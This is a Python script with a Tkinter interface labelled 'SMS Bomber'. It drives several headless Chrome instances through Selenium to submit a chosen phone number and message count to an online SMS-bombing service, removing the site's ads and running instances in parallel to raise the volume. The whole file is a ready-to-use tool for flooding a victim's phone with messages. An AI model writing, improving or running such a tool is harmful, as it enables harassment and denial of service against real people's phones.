import tkinter as tk
from tkinter import messagebox
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import threading

# Function to setup each browser instance
def setup_browser_instance(phone_number, count_number, instance_id):
    chrome_options = Options()
    
    # Path to ChromeDriver
    driver_path = "D:\\chromedriver-win64\\chromedriver.exe"
    service = Service(driver_path)
    
    # Use a unique profile for each instance to avoid conflicts
    chrome_options.add_argument(f"--user-data-dir=D:\\chrome_profiles\\profile_{instance_id}")
    
    # Run in headless mode to perform all tasks in the background
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920x1080")
    
    driver = webdriver.Chrome(service=service, options=chrome_options)

    try:
        url = "https://greatonlinetools.com/smsbomber/"
        driver.get(url)
        
        wait = WebDriverWait(driver, 60)

        def handle_ads(driver, wait, instance_id):
            try:
                overlay_elements = driver.find_elements(By.XPATH, "//*[@class='overlay-class']")
                for element in overlay_elements:
                    driver.execute_script("arguments[0].remove();", element)
                    print(f"[Instance {instance_id}] Removed overlay.")

                ad_iframes = driver.find_elements(By.CSS_SELECTOR, 'iframe[id^="google_ads_iframe_"]')
                for iframe in ad_iframes:
                    driver.execute_script("arguments[0].remove();", iframe)
                    print(f"[Instance {instance_id}] Removed ad iframe.")
            except Exception as e:
                print(f"[Instance {instance_id}] Error handling ads: {e}")

        phone_input = wait.until(EC.presence_of_element_located((By.ID, "mobile")))
        count_input = wait.until(EC.presence_of_element_located((By.ID, "count")))
        start_button = wait.until(EC.element_to_be_clickable((By.ID, "start")))

        driver.execute_script("arguments[0].scrollIntoView(true);", start_button)

        def safe_click(element, driver, instance_id, retries=3):
            for attempt in range(retries):
                try:
                    handle_ads(driver, wait, instance_id)
                    driver.execute_script("arguments[0].scrollIntoView(true);", element)
                    element.click()
                    print(f"[Instance {instance_id}] Start button clicked.")
                    return
                except Exception as e:
                    print(f"[Instance {instance_id}] Click attempt {attempt+1} failed: {e}")
                    time.sleep(1)
                    
                    if attempt == retries - 1:
                        print(f"[Instance {instance_id}] Error occurred, closing application.")
                        driver.quit()
                        return

        phone_input.send_keys(phone_number)
        count_input.send_keys(count_number)
        safe_click(start_button, driver, instance_id)
        
        print(f"[Instance {instance_id}] Browser will stay open for 10 minutes...")
        time.sleep(600)
    finally:
        driver.quit()

# Function to start multiple browser instances
def start_browsers(phone_number, count_number, num_instances):
    # List of restricted phone numbers
    restricted_numbers = ["+910000000000", "+911234567890"]  # Add more restricted numbers as needed
    
    if phone_number in restricted_numbers:
        messagebox.showwarning("Warning", "The entered phone number is restricted and cannot be used.")
        return
    
    threads = []
    for i in range(num_instances):
        # All instances will run in headless mode to work in the background
        thread = threading.Thread(target=setup_browser_instance, args=(phone_number, count_number, i+1))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print("All browser instances completed.")

# Function to create the GUI
def create_gui():
    global start_button  # Declare start_button as global to modify its state within functions
    root = tk.Tk()
    root.title("SMS Bomber")

    tk.Label(root, text="Phone Number:").grid(row=0, column=0, padx=10, pady=10)
    phone_entry = tk.Entry(root)
    phone_entry.grid(row=0, column=1, padx=10, pady=10)

    tk.Label(root, text="Count:").grid(row=1, column=0, padx=10, pady=10)
    count_entry = tk.Entry(root)
    count_entry.grid(row=1, column=1, padx=10, pady=10)

    tk.Label(root, text="Fast SMS (Number of Instances):").grid(row=2, column=0, padx=10, pady=10)
    instances_entry = tk.Entry(root)
    instances_entry.grid(row=2, column=1, padx=10, pady=10)
    instances_entry.insert(0, "5")  # Default value set to 5

    start_button = tk.Button(
        root, 
        text="Start", 
        command=lambda: start_browsers(phone_entry.get(), count_entry.get(), int(instances_entry.get()))
    )
    start_button.grid(row=3, column=0, columnspan=2, pady=20)

    root.mainloop()

if __name__ == "__main__":
    create_gui()
